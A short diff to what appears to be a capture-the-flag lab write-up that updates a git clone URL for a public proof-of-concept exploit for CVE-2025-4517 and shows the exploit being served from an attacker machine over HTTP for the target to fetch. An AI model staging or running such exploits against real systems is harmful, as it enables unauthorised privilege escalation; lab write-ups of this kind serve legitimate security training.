@@ -127,8 +127,8 @@ sudo -l
 
 ```
 # On Kali
-git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
-cd CVE-2025-4517-POC-HTB-WingData
+git clone https://github.com/AzureADTrent/CVE-2025-4517-POC
+cd CVE-2025-4517-POC
 python3 -m http.server 80
 
 # On target
